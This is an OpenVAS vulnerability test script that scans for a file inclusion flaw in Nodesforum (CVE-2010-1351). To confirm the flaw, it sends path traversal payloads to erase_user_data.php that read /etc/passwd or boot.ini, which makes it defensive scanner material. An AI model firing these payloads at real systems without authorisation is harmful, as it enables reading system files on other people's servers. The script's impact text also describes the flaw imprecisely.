###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nodesforum_mult_rfi_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Nodesforum Multiple Remote File Inclusion Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to execute arbitrary code in a
  user's browser session in the context of an affected site.
  Impact Level: Application";
tag_affected = "Nodesforum version 1.045 and prior.";
tag_insight = "Input passed to '_nodesforum_path_from_here_to_nodesforum_folder' parameter
  in 'erase_user_data.php' and to the '_nodesforum_code_path' parameter in
  'pre_output.php' is not being validated before being used to include files.";
tag_solution = "No solution or patch is available as of 15th April, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://home.nodesforum.com/download";
tag_summary = "This host is running Nodesforum and is prone to multiple remote file
  inclusion vulnerabilities.";

if(description)
{
  script_id(902040);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-04-16 16:17:26 +0200 (Fri, 16 Apr 2010)");
  script_cve_id("CVE-2010-1351");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Nodesforum Multiple Remote File Inclusion Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39311");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/57517");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12047");

  script_description(desc);
  script_summary("Check for the attack string on Nodesforum");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

nodePort = get_http_port(default:80);
if(!nodePort){
  exit(0);
}

foreach dir (make_list("/nodesforum", "/Nodesforum", "/", cgi_dirs()))
{
  sndReq = http_get(item:string(dir , "/index.php"), port:nodePort);
  rcvRes = http_send_recv(port:nodePort, data:sndReq);

  if("Nodesforum" >< rcvRes)
  {
    # Attack string for Linux
    sndReq = http_get(item:string(dir, "/erase_user_data.php?_nodesforum_path" +
                      "_from_here_to_nodesforum_folder=../../../../../../../" +
                      "../etc/passwd%00"), port:nodePort);
    rcvRes = http_send_recv(port:nodePort, data:sndReq);
    if(("root" >< rcvRes) && ("daemon:/sbin:/sbin/" >< rcvRes))
    {
      security_hole(nodePort);
      exit(0);
    }

    # Attack string for Windows
    sndReq = http_get(item:string(dir, "/erase_user_data.php?_nodesforum_path" +
                      "_from_here_to_nodesforum_folder=../../../../../../../" +
                      "../boot.ini%00"), port:nodePort);
    rcvRes = http_send_recv(port:nodePort, data:sndReq);
    if(("\WINDOWS" >< rcvRes) && ("partition" >< rcvRes))
    {
      security_hole(nodePort);
      exit(0);
    }
  }
}
